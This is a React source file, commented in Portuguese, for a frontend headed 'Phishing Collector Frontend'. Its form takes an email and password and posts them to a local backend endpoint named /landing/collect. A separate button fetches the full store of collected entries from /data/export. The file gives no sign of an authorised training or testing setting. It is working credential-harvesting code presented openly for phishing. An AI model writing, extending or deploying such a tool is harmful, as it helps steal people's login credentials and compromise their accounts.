import React, { useState } from 'react';

function App() {
  // Estados para os inputs e respostas
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [collectResponse, setCollectResponse] = useState(null);
  const [exportData, setExportData] = useState([]);

  // URL base do seu backend (certifique-se de que o backend esteja rodando em http://localhost:8000)
  const backendUrl = 'http://localhost:8000';

  // Função para envio do formulário de coleta
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch(`${backendUrl}/landing/collect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      const data = await res.json();
      setCollectResponse(data);
      setEmail('');
      setPassword('');
    } catch (error) {
      console.error('Erro ao enviar dados:', error);
    }
  };

  // Função para carregar os dados exportados
  const handleExport = async () => {
    try {
      const res = await fetch(`${backendUrl}/data/export`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' }
      });
      const data = await res.json();
      setExportData(data);
    } catch (error) {
      console.error('Erro ao carregar dados:', error);
    }
  };

  return (
    <div className="container">
      <h1>Phishing Collector Frontend</h1>
      
      <div className="form-container">
        <h2>Coleta de Dados</h2>
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label>Email:</label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          <div className="form-group">
            <label>Senha:</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
          <button type="submit">Enviar Dados</button>
        </form>
        {collectResponse && (
          <div className="response">
            <h3>Resposta do Backend:</h3>
            <pre>{JSON.stringify(collectResponse, null, 2)}</pre>
          </div>
        )}
      </div>
      
      <div className="export-container">
        <h2>Exportar Dados</h2>
        <button onClick={handleExport}>Carregar Dados</button>
        {exportData.length > 0 && (
          <div className="response">
            <h3>Dados Exportados:</h3>
            <pre>{JSON.stringify(exportData, null, 2)}</pre>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
